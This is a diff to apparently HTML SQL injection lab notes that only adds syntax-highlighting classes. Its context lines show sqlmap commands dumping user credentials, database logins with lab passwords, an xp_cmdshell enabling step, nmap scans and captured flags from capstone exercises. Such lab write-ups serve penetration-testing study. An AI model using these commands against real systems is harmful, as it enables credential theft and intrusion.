@@ -151,7 +151,7 @@ done
 <p>Capture resulting shells or downloaded files as proof.</p>
 <h3>Automation Helpers</h3>
 <p>Manual exploitation teaches you the structure; once mapped, pivot to <code>sqlmap</code> for breadth.</p>
-<pre><code>sqlmap -u &quot;https://portal.acme.local/product.php?id=1&quot; --batch --level=3 --risk=2 --dump -D acme -T users -C username,password
+<pre><code class="language-bash">sqlmap -u &quot;https://portal.acme.local/product.php?id=1&quot; --batch --level=3 --risk=2 --dump -D acme -T users -C username,password
 </code></pre>
 <p>Store <code>sqlmap</code> audit logs and sanitized dumps; they belong in the technical appendix.</p>
 <h3>Defensive Guidance</h3>
@@ -212,7 +212,7 @@ $result = mysqli_query($con, $sql_query);
 <li>Run version to retrieve version of running instance.</li>
 <li>Verify current DB user.</li>
 </ul>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/shells]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ mysql -u root -p&#39;root&#39; -h 192.168.214.16 -P 3306 
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MySQL connection id is 9
@@ -291,7 +291,7 @@ MySQL [(none)]&gt;
 <li>Forces NTLM auth instead of Kerberos.</li>
 <li>Inspect current version of the underlying OS <code>@@version</code></li>
 </ul>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/shells]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ impacket-mssqlclient Administrator:Lab123@192.168.214.18 -windows-auth
 Impacket v0.11.0 - Copyright 2023 Fortra
 
@@ -700,7 +700,7 @@ web application
 <li>Once enabled; must be called with EXECUTE keyword instead of SELECT.</li>
 </ul>
 <p><em>In th example DB the Administrator user has the appropriate perms, enable xp_cmdshell by simulating SQLi via impacket-mssqlclient</em></p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/shells]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ impacket-mssqlclient Administrator:Lab123@192.168.209.18 -windows-auth
 Impacket v0.11.0 - Copyright 2023 Fortra
 
@@ -764,7 +764,7 @@ NULL
 <li>Can ID and exploit SQLi vulns against various DB engines.</li>
 <li>Set the URL we want to scan with <code>-u</code> and specify the parameter to test using <code>-p</code></li>
 </ul>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/shells]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ sqlmap 192.168.209.19/blindsqli.php?user=1 -p user
         ___
        __H__
@@ -825,7 +825,7 @@ back-end DBMS: MySQL &gt;= 5.0.12
 <li>We can also dump the DB table and steal creds with sqlmap.</li>
 <li><em>Although sqlmap is a great tool to automate SQLi attacks, it provides next-to-zero stealth. Due to its high-volume of traffic, sqlmap should not be used as a first choice tool during assignments that require staying under the radar.</em>.</li>
 </ul>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/shells]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ sqlmap 192.168.209.19/blindsqli.php?user=1 -p user --dump
         ___
        __H__
@@ -1287,7 +1287,7 @@ www-data@Alvida:/var/www$
 OS{2edb78ffeaeba64232f91b2c8d03f383}
 </code></pre>
 <p>Capstone Exercise: Enumerate the Module Exercise - VM #2 and exploit the SQLi vulnerability in order to get the flag.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-5]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-5]
 └─$ sudo nmap -sS -sV 192.168.212.48
 [sudo] password for operator: 
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 14:21 PDT
@@ -1570,7 +1570,7 @@ cat /var/www/flag.txt
 OS{42c0d162385627b8b4ffa06e3d149ea9}
 </code></pre>
 <p>Capstone Exercise: Enumerate the Module Exercise - VM #3 and exploit the SQLi vulnerability in order to get the flag.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/sqli]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/sqli]
 └─$ sudo nmap -sS -sV 192.168.212.49
 [sudo] password for operator: 
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 16:23 PDT
@@ -1682,7 +1682,7 @@ OS{78e9846e2346582bfc14a5d39c6ab01e}
 OS{78e9846e2346582bfc14a5d39c6ab01e}
 </code></pre>
 <p>Capstone Exercise: Enumerate the Module Exercise - VM #4 and exploit the SQLi vulnerability in order to get the flag.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-7]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-7]
 └─$ sudo nmap -sS -sV 192.168.212.50
 [sudo] password for operator: 
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 07:41 PDT
